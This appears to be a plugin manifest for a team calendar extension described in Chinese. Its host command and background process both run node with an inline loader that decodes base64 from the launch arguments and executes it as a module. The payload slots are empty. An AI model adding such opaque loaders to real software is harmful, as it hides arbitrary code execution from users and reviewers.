{
  "id": "opcb.team-calendar",
  "name": "团队日历 1.0.6",
  "apiVersion": 1,
  "description": "多项目统一日历、团队整月排期与会议安排，界面和 MCP 共用数据。",
  "discovery": {
    "category": "productivity",
    "tags": [
      "calendar",
      "team",
      "tasks"
    ]
  },
  "host": {
    "commands": [
      {
        "id": "calendar-client",
        "program": "node",
        "args": [
          "--input-type=module",
          "-e",
          "await import('data:text/javascript;base64,'+process.argv.slice(1).join(''))",
          "",
          "",
          ""
        ],
        "maxInputBytes": 65536,
        "maxOutputBytes": 1048576
      }
    ],
    "processes": [
      {
        "id": "calendar-events",
        "program": "node",
        "args": [
          "--input-type=module",
          "-e",
          "await import('data:text/javascript;base64,'+process.argv.slice(1).join(''))",
          "",
          ""
        ]
      }
    ]
  }
}
